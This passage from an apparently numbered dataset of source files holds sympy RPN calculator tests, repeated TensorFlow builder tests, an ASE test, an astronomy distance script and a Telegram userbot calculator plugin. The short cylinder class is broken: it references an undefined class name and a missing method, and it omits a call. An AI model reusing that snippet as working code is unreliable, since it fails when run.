'1/((x + 1)*(x + 2))'\n\n# op3\nassert calc.rpn('x**3 x 3 eval') == '27'\nassert calc.rpn('0 0 point 0 1 point 1 0 point triangle') == 'Triangle(Point2D(1, 0), Point2D(0, 1), Point2D(0, 0))'\nassert calc.rpn('x sin x / x 0 limit') == '1'\nassert calc.rpn('limit(sin(x)/x,x,0)') == '1'\n\n# op4\nassert calc.rpn('Sum(1/x**2,(x,1,oo)).doit()') == 'pi**2/6'\nassert calc.rpn('1 x x * / x 1 oo sum') == 'pi**2/6'\n\n# misc\ncalc.rpn('2 5 * clr')\nassert calc.stack == []\n\ncalc.rpn('12 dup')\nassert calc.stack == [12, 12]\n\ncalc.rpn('12 13 drp')\nassert calc.stack == [12]\n\ncalc.rpn('12 13 swp')\nassert calc.stack == [13, 12]\n\ncalc.rpn('2*x f=')\nassert calc.rpn('f') == '2*x'\ncalc.rpn('x-1 g=')\nassert calc.rpn('g') == 'x - 1'\n\nassert calc.rpn('f g +') == '3*x - 1'\nassert calc.rpn('f g *') == '2*x*(x - 1)'\nassert calc.rpn('f g xeval') == '2*x - 2'  # f o g\nassert calc.rpn('g f xeval') == '2*x - 1'  # g o f\n\n################################################### Geometry: intersection\n\n# intersection: Circle,Circle -> Circle\n# intersection: Circle,Circle -> [Point2D]\nassert calc.rpn('0 0 point 1 circle 0 0 point 1 circle intersection') == 'Circle(Point2D(0, 0), 1)'\nassert calc.rpn('0 0 point 1 circle 1 0 point 1 circle intersection') == '[Point2D(1/2, -sqrt(3)/2), Point2D(1/2, sqrt(3)/2)]'\nassert calc.rpn('0 0 point 1 circle 2 0 point 1 circle intersection') == '[Point2D(1, 0)]'\nassert calc.rpn('0 0 point 1 circle 3 0 point 1 circle intersection') == '[]'\n\n# intersection: Line,Line -> [Line]\n# intersection: Line,Line -> [Point2D]\nassert calc.rpn('0 0 point 1 0 point line 0 0 point 1 0 point line intersection') == '[Line(Point2D(0, 0), Point2D(1, 0))]'\nassert calc.rpn('0 0 point 1 0 point line 0 0 point 0 1 point line intersection') == '[Point2D(0, 0)]'\nassert calc.rpn('0 0 point 1 0 point line 0 1 point 1 1 point line intersection') == '[]'\n\n# intersection: Circle,Line -> [Point]\nassert calc.rpn('0 0 point 1 circle 0 0 point 1 0 point line intersection') == '[Point2D(-1, 0), Point2D(1, 0)]'\nassert calc.rpn('0 0 point 1 circle 0 1 point 1 1 point line intersection') == '[Point2D(0, 1)]'\nassert calc.rpn('0 0 point 1 circle 0 2 point 1 2 point line intersection') == '[]'\n\n# intersection: Triangle,Line -> [Point]\n# intersection: Triangle,Line -> [Segment]\nassert calc.rpn('0 0 point 1 0 point 0 1 point triangle 0 0 point 1 1 point line intersection') == '[Point2D(1/2, 1/2), Point2D(0, 0)]'\nassert calc.rpn('0 0 point 1 0 point 0 1 point triangle 0 0 point -1 1 point line intersection') == '[Point2D(0, 0)]'\nassert calc.rpn('0 0 point 1 0 point 0 1 point triangle 1 0 point 0 1 point line intersection') == '[Segment(Point2D(0, 1), Point2D(1, 0)), Point2D(1, 0), Point2D(0, 1)]'\nassert calc.rpn('0 0 point 1 0 point 0 1 point triangle 0 2 point 2 0 point line intersection') == '[]'\n\n# intersection: Triangle,Circle -> [Point]\nassert calc.rpn('0 0 point 1 0 point 0 1 point triangle 0 0 point 1/2 circle intersection') == '[Point2D(1/2, 0), Point2D(0, 1/2)]'\nassert calc.rpn('-2 -1 point 2 -1 point 0 3 point triangle 0 0 point 2 circle intersection') == '[Point2D(-sqrt(11)/5 + 6/5, 3/5 + 2*sqrt(11)/5), Point2D(sqrt(11)/5 + 6/5, -2*sqrt(11)/5 + 3/5), Point2D(-sqrt(3), -1), Point2D(sqrt(3), -1), Point2D(-6/5 - sqrt(11)/5, -2*sqrt(11)/5 + 3/5), Point2D(-6/5 + sqrt(11)/5, 3/5 + 2*sqrt(11)/5)]'\n\n# intersection: Triangle,Triangle -> [Point] (judisk stj\u00c3\u00a4rna)\nassert calc.rpn('0 2 point 2 -1 point -2 -1 point triangle 2 1 point 0 -2 point -2 1 point triangle intersection') == '[Point2D(-2/3, -1), Point2D(-4/3, 0), Point2D(2/3, -1), Point2D(4/3, 0), Point2D(2/3, 1), Point2D(-2/3, 1)]'\n\n################################################### Geometry: tangent_lines\n\n# tangent_lines: Circle,Point -> [Line]\nassert calc.rpn('0 0 point 1 circle 0 2 point tangent_lines') == '[Line(Point2D(0, 2), Point2D(-sqrt(3)/2, 1/2)), Line(Point2D(0, 2), Point2D(sqrt(3)/2, 1/2))]'\nassert calc.rpn('0 0 point 1 circle 0 1 point tangent_lines') == '[Line(Point2D(0, 1), Point2D(1, 1))]'\nassert calc.rpn('0 0 point 1 circle 0 1/2 point tangent_lines') == '[]'\n\n################################################### Geometry: Misc\n\n# perpendicular_line: Line,Point -> Line\nassert calc.rpn('0 0 point 1 1 point line 3 4 point perpendicular_line') == 'Line(Point2D(3, 4), Point2D(4, 3))'\nassert calc.rpn('0 0 point 1 1 point line 1/2 1/2 point perpendicular_line') == 'Line(Point2D(1/2, 1/2), Point2D(3/2, -1/2))'\n\n# incircle: Triangle -> Circle\nassert calc.rpn('0 0 point 1 0 point 0 1 point triangle incircle') == 'Circle(Point2D(-sqrt(2)/2 + 1, -sqrt(2)/2 + 1), -1 + sqrt(2)/2)'\nassert calc.rpn('0 0 point 1 0 point 0 1 point triangle circumcircle') == 'Circle(Point2D(1/2, 1/2), sqrt(2)/2)'\n\n\n###################################################\nassert calc.rpn('0 0 point 1 0 point line xaxis=') == 'Line(Point2D(0, 0), Point2D(1, 0))'\n\nassert calc.rpn('0 8 point B=') == 'Point2D(0, 8)'\nassert calc.rpn('0 2 point A=') == 'Point2D(0, 2)'\nassert calc.rpn('A 2 circle C1=') == 'Circle(Point2D(0, 2), 2)'\nassert calc.rpn('C1 B tangent_lines 0 item BC=') == 'Line(Point2D(0, 8), Point2D(-4*sqrt(2)/3, 8/3))'\nassert calc.rpn('C1 BC intersection 0 item C=') == 'Point2D(-4*sqrt(2)/3, 8/3)'\nassert calc.rpn('xaxis BC intersection 0 item D=') == 'Point2D(-2*sqrt(2), 0)'\nassert calc.rpn('D A line DA=') == 'Line(Point2D(-2*sqrt(2), 0), Point2D(0, 2))'\nassert calc.rpn('C1 DA intersection 0 item E=') == 'Point2D(-2*sqrt(6)/3, -2*sqrt(3)/3 + 2)'\nassert calc.rpn('DA E perpendicular_line GH=') == 'Line(Point2D(-2*sqrt(6)/3, -2*sqrt(3)/3 + 2), Point2D(-2*sqrt(6)/3 + 2, -2*sqrt(2) - 2*sqrt(3)/3 + 2))'\nassert calc.rpn('GH D B line intersection 0 item G=') == 'Point2D(-sqrt(2) - sqrt(6)/3, -4*sqrt(3)/3 + 4)'\nassert calc.rpn('GH xaxis intersection 0 item H=') == 'Point2D(-sqrt(6) + sqrt(2), 0)'\nassert calc.rpn('G D H triangle DGH=') == 'Triangle(Point2D(-sqrt(6) + sqrt(2), 0), Point2D(-2*sqrt(2), 0), Point2D(-sqrt(2) - sqrt(6)/3, -4*sqrt(3)/3 + 4))'\nassert calc.rpn('DGH incircle C2=') == 'Circle(Point2D(-2*sqrt(6) + 2*sqrt(2), -2*sqrt(3) + 4), -4 + 2*sqrt(3))'\nassert calc.rpn('C2 center I=') == 'Point2D(-2*sqrt(6) + 2*sqrt(2), -2*sqrt(3) + 4)'\nassert calc.rpn('C2 radius') == '-4 + 2*sqrt(3)'\nassert calc.rpn('C2 radius N') == '-0.535898384862245'\n\ncalc.rpn('defs')\n\ncalc.run()", "467": "import math\nclass cylinder:\n\n  def __init__(self,radius,height):\n    self.set_radius(radius)\n    self.set_height(height)\n  \n  def get_radius(self):\n    return self.radius\n  def set_height(self,height):\n    if height>0:\n      self.height = height\n\n  def calc_base_area(self):\n    return math.pi*(self.radius**2)\n  def calc_surface_area(self):\n    return 2*(math.pi*self.radius)* self.height\n\n  def calc_area(self):\n    return 2* self.calc_base_area() + self.calc_surface_area\n\n  def calc_volume(self):\n    return self.calc_base_area() * self.height\n\ncylinder = Cylinder(3,5)\nprint(\"Area:\",cylinder.calc_area())\nprint(\"Volume:\",cylinder.calc_volume())\n", "468": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow.compat.v1 as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "469": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "470": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "471": "import pytest\nfrom ase.build import bulk\nfrom ase.test.factories import ObsoleteFactoryWrapper\n\n\nomx_par = {'definition_of_atomic_species': [['Al', 'Al8.0-p1', 'Al_CA13'],\n                                            ['O', 'O6.0-p1', 'O_CA13']]}\n\n\nrequired = {'aims': dict(sc_accuracy_rho=5.e-3)}\n\n\ncalc = pytest.mark.calculator\n@calc('abinit', ecut=200, toldfe=0.0001, chksymbreak=0)\n@calc('openmx', **omx_par)\n@calc('elk', rgkmax=5.0)\ndef test_al(factory):\n    run(factory)\n\n@pytest.mark.parametrize('name', sorted(required))\ndef test_al_old(name):\n    factory = ObsoleteFactoryWrapper(name)\n    run(factory)\n\n\ndef run(factory):\n    name = factory.name\n    par = required.get(name, {})\n    # What on earth does kpts=1.0 mean?  Was failing, I changed it.  --askhl\n    # Disabled GPAW since it was failing anyway. --askhl\n    kpts = [2, 2, 2]\n    calc = factory.calc(label=name, xc='LDA', kpts=kpts, **par)\n    al = bulk('AlO', crystalstructure='rocksalt', a=4.5)\n    al.calc = calc\n    e = al.get_potential_energy()\n    calc.set(xc='PBE', kpts=kpts)\n    epbe = al.get_potential_energy()\n    print(e, epbe)\n    calc = factory.calc(restart=name)\n    print(calc.parameters, calc.results, calc.atoms)\n    assert not calc.calculation_required(al, ['energy'])\n    al = calc.get_atoms()\n    print(al.get_potential_energy())\n    label = 'dir/' + name + '-2'\n    calc = factory.calc(label=label, atoms=al, xc='LDA', kpts=kpts,\n                        **par)\n    print(al.get_potential_energy())\n", "472": "import numpy as np\nfrom isochrones.mist.bc import MISTBolometricCorrectionGrid\nbc_grid = MISTBolometricCorrectionGrid(['u', 'g', 'r', 'i', 'z', 'V'])\nfrom isochrones import get_ichrone\nmist = get_ichrone('mist')\n\ndef get_mag_from_mass(mass, age_gyr, feh):\n    log_age = np.log10(age_gyr*1e9)\n    eep = mist.get_eep(mass, log_age, feh, accurate=True)\n    teff, logg = mist.interp_value([eep, log_age, feh], ['Teff', 'logg'])\n    mags = bc_grid.interp([teff, logg, feh, 0.],\n                          ['u', 'g', 'r', 'i', 'z', 'V'])\n    rmag = mags[2]\n    return teff, rmag\n\ndef calc_distance_from_M(M, m=24):\n    # m - M = 5log(D) - 5\n    D = 10**((m - M + 5)/5)\n    return D*1e-3\n\n\nif __name__ == \"__main__\":\n    lim = 16\n    faint_lim = 24\n    ztf = True\n    f = 1\n    if ztf:\n        lim = 13  # ZTF\n        faint_lim = 17 # ZTF\n        f = 1e3\n\n    # teff, rmag = get_mag_from_mass(1., 4.56, 0.)\n    # print(calc_distance_from_M(rmag, m=lim), \"-\",\n    #       calc_distance_from_M(rmag, m=faint_lim), \"kpc, G\", rmag)  # Sun\n\n    # teff, rmag = get_mag_from_mass(.55, 12, 0.)\n    # print(calc_distance_from_M(rmag, m=lim), \"-\",\n    #       calc_distance_from_M(rmag, m=faint_lim), \"kpc, M0\", rmag)  # M0\n\n    # teff, rmag = get_mag_from_mass(.16, 12, 0.)\n    # print(calc_distance_from_M(rmag, m=lim), \"-\",\n    #       calc_distance_from_M(rmag, m=faint_lim), \"kpc, M5\", rmag)  # M5\n\n    # teff, rmag = get_mag_from_mass(.082, 12, 0.)\n    # print(calc_distance_from_M(rmag, m=lim)*1e3, \"-\",\n    #       calc_distance_from_M(rmag, m=faint_lim)*1e3, \"pc, M8\", rmag)  # M8\n\n    print(calc_distance_from_M(0, m=lim)*f, \"-\",\n          calc_distance_from_M(0, m=faint_lim)*f, \"kpc, subgiant\")  # Sun\n\n    print(calc_distance_from_M(3.87, m=lim)*f, \"-\",\n          calc_distance_from_M(3.87, m=faint_lim)*f, \"kpc, F7\")  # F0\n\n    print(calc_distance_from_M(4.45, m=lim)*f, \"-\",\n          calc_distance_from_M(4.45, m=faint_lim)*f, \"kpc, G0\")  # Sun\n\n    print(calc_distance_from_M(5.55, m=lim)*f, \"-\",\n          calc_distance_from_M(5.55, m=faint_lim)*f, \"kpc, G9\")  # Sun\n\n    print(calc_distance_from_M(5.76, m=lim)*f, \"-\",\n          calc_distance_from_M(5.76, m=faint_lim)*f, \"kpc, K0\")  # Ko\n\n    print(calc_distance_from_M(8.69, m=lim)*f, \"-\",\n          calc_distance_from_M(8.69, m=faint_lim)*f, \"kpc, K9\")  # Ko\n\n    print(calc_distance_from_M(8.91, m=lim)*f, \"-\",\n          calc_distance_from_M(8.91, m=faint_lim)*f, \"kpc, M0\")  # M0\n\n    print(calc_distance_from_M(11.02, m=lim)*f, \"-\",\n          calc_distance_from_M(11.02, m=faint_lim)*f, \"kpc, M5\")  # M5\n\n    print(calc_distance_from_M(13.62, m=lim)*f, \"-\",\n          calc_distance_from_M(13.62, m=faint_lim)*f, \"kpc, M8\")  # M8\n", "473": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "474": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "475": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "476": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import *\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    if x == \"AC\":\n        udB.delete(\"calc\")\n        return await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == \"C\":\n        udB.delete(\"calc\")\n        return await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get[:-1])\n            return await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/100\")\n            return await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/\")\n            return await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"*\")\n            return await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        get = udB.get(\"calc\")\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = await calcc(get, e)\n            try:\n                num = float(out)\n                return await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                udB.delete(\"calc\")\n                return await e.answer(\"Error\", cache_time=0, alert=True)\n        return await e.answer(\"None\")\n    else:\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + x)\n            return await e.answer(str(get + x))\n        udB.set(\"calc\", x)\n        return await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        